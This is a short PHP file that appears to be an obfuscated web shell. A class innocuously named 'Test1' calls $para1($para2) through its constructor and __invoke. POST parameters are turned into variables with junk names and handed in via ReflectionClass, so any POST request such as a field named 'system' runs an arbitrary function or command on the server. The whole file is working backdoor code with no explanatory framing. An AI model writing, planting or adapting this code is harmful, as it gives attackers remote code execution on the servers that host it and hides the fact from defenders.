<?php
class Test1
{
    private $para1 = '';
    private $para2 = '';

    public function __invoke($para1, $para2)
    {
        $para1($para2);
    }
    public function __construct($para1, $para2)
    {
        $this($para1, $para2);
    }
}

$class1 = new ReflectionClass("Test1");

foreach (array('_POST') as $_r1) {
    foreach ($$_r1 as $_asadasd=>$_wfwefb) {

                    $$_asadasd =$_wfwefb;
    }
}
$class2 = $class1->newInstance($_asadasd, $$_asadasd);
